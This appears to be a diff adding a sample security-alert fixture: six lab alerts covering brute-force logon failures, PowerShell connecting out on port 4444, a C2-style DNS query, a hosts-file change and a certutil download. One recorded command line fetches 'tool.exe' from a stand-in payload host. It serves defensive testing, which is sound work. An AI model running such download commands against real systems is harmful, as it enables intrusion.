@@ -1,0 +1,223 @@
+[
+  {
+    "timestamp": "2026-09-26T10:00:00.000+0000",
+    "rule": {
+      "level": 10,
+      "description": "Multiple Windows logon failures (sample)",
+      "id": "60204",
+      "firedtimes": 5,
+      "mail": false,
+      "groups": ["windows", "windows_security", "authentication_failures"],
+      "mitre": {
+        "id": ["T1110"],
+        "tactic": ["Credential Access"],
+        "technique": ["Brute Force"]
+      }
+    },
+    "agent": { "id": "001", "name": "SAMPLE-WIN10", "ip": "192.168.56.101" },
+    "manager": { "name": "sample-manager" },
+    "id": "1790000000.1000001",
+    "full_log": "SAMPLE Windows Security event 4625: an account failed to log on.",
+    "decoder": { "name": "windows_eventchannel" },
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Security-Auditing",
+          "eventID": "4625",
+          "computer": "SAMPLE-WIN10",
+          "channel": "Security"
+        },
+        "eventdata": {
+          "targetUserName": "administrator",
+          "ipAddress": "198.51.100.99",
+          "logonType": "3",
+          "workstationName": "ATTACKER-PC",
+          "status": "0xc000006d"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "timestamp": "2026-09-26T10:05:00.000+0000",
+    "rule": {
+      "level": 10,
+      "description": "Sysmon: PowerShell made an outbound network connection (sample rule)",
+      "id": "100201",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": ["windows", "sysmon", "sysmon_event3"],
+      "mitre": {
+        "id": ["T1059.001"],
+        "tactic": ["Execution"],
+        "technique": ["PowerShell"]
+      }
+    },
+    "agent": { "id": "001", "name": "SAMPLE-WIN10", "ip": "192.168.56.101" },
+    "manager": { "name": "sample-manager" },
+    "id": "1790000300.1000002",
+    "full_log": "SAMPLE Sysmon event 3: network connection detected.",
+    "decoder": { "name": "windows_eventchannel" },
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "eventID": "3",
+          "computer": "SAMPLE-WIN10",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "protocol": "tcp",
+          "sourceIp": "192.168.56.101",
+          "sourcePort": "49822",
+          "destinationIp": "203.0.113.88",
+          "destinationPort": "4444",
+          "user": "SAMPLE-WIN10\\labuser"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "timestamp": "2026-09-26T10:07:00.000+0000",
+    "rule": {
+      "level": 12,
+      "description": "Sysmon: certutil downloaded a file (sample rule)",
+      "id": "100210",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": ["windows", "sysmon", "sysmon_event1"],
+      "mitre": {
+        "id": ["T1105"],
+        "tactic": ["Command and Control"],
+        "technique": ["Ingress Tool Transfer"]
+      }
+    },
+    "agent": { "id": "001", "name": "SAMPLE-WIN10", "ip": "192.168.56.101" },
+    "manager": { "name": "sample-manager" },
+    "id": "1790000420.1000003",
+    "full_log": "SAMPLE Sysmon event 1: process created.",
+    "decoder": { "name": "windows_eventchannel" },
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "eventID": "1",
+          "computer": "SAMPLE-WIN10",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\certutil.exe",
+          "commandLine": "certutil.exe -urlcache -f http://sample-payloads.example/tool.exe tool.exe",
+          "parentImage": "C:\\Windows\\System32\\cmd.exe",
+          "hashes": "SHA1=1111111111111111111111111111111111111111,MD5=22222222222222222222222222222222,SHA256=3333333333333333333333333333333333333333333333333333333333333333,IMPHASH=44444444444444444444444444444444",
+          "user": "SAMPLE-WIN10\\labuser"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "timestamp": "2026-09-26T10:09:00.000+0000",
+    "rule": {
+      "level": 8,
+      "description": "Sysmon: DNS query for a suspicious name (sample rule)",
+      "id": "100220",
+      "firedtimes": 2,
+      "mail": false,
+      "groups": ["windows", "sysmon", "sysmon_event22"],
+      "mitre": {
+        "id": ["T1071"],
+        "tactic": ["Command and Control"],
+        "technique": ["Application Layer Protocol"]
+      }
+    },
+    "agent": { "id": "001", "name": "SAMPLE-WIN10", "ip": "192.168.56.101" },
+    "manager": { "name": "sample-manager" },
+    "id": "1790000540.1000004",
+    "full_log": "SAMPLE Sysmon event 22: DNS query.",
+    "decoder": { "name": "windows_eventchannel" },
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "eventID": "22",
+          "computer": "SAMPLE-WIN10",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Users\\labuser\\AppData\\Local\\Temp\\tool.exe",
+          "queryName": "update-check.sample-c2.example",
+          "queryStatus": "0",
+          "user": "SAMPLE-WIN10\\labuser"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "timestamp": "2026-09-26T10:12:00.000+0000",
+    "rule": {
+      "level": 7,
+      "description": "Integrity checksum changed.",
+      "id": "550",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": ["ossec", "syscheck", "syscheck_entry_modified", "syscheck_file"],
+      "mitre": {
+        "id": ["T1565.001"],
+        "tactic": ["Impact"],
+        "technique": ["Stored Data Manipulation"]
+      }
+    },
+    "agent": { "id": "002", "name": "SAMPLE-SRV-02", "ip": "192.168.56.102" },
+    "manager": { "name": "sample-manager" },
+    "id": "1790000720.1000005",
+    "full_log": "File 'C:\\Windows\\System32\\drivers\\etc\\hosts' modified (sample)",
+    "decoder": { "name": "syscheck_integrity_changed" },
+    "syscheck": {
+      "path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "mode": "scheduled",
+      "size_before": "824",
+      "size_after": "911",
+      "md5_after": "55555555555555555555555555555555",
+      "sha1_after": "6666666666666666666666666666666666666666",
+      "sha256_after": "7777777777777777777777777777777777777777777777777777777777777777",
+      "event": "modified"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-09-26T10:15:00.000+0000",
+    "rule": {
+      "level": 3,
+      "description": "Windows logon success.",
+      "id": "60106",
+      "firedtimes": 12,
+      "mail": false,
+      "groups": ["windows", "windows_security", "authentication_success"]
+    },
+    "agent": { "id": "001", "name": "SAMPLE-WIN10", "ip": "192.168.56.101" },
+    "manager": { "name": "sample-manager" },
+    "id": "1790000900.1000006",
+    "full_log": "SAMPLE Windows Security event 4624: an account was successfully logged on.",
+    "decoder": { "name": "windows_eventchannel" },
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Security-Auditing",
+          "eventID": "4624",
+          "computer": "SAMPLE-WIN10",
+          "channel": "Security"
+        },
+        "eventdata": {
+          "targetUserName": "labuser",
+          "ipAddress": "192.168.56.20",
+          "logonType": "2"
+        }
+      }
+    },
+    "location": "EventChannel"
+  }
+]
